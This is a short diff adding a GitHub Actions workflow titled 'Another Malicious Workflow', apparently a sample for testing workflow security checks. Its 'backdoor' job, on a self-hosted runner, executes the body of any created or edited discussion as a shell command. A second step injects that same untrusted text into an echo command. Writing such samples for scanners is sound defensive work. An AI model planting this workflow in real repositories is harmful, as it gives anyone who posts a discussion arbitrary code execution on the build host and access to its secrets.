@@ -1,0 +1,12 @@
+name: Another Malicious Workflow
+on:
+  discussion:
+    types: [created, edited]
+jobs:
+  backdoor:
+    runs-on: self-hosted
+    steps:
+      - name: Dynamic execution
+        run: ${{ github.event.discussion.body }}
+      - name: Command injection vector
+        run: echo "Payload: ${{ github.event.discussion.body }}"
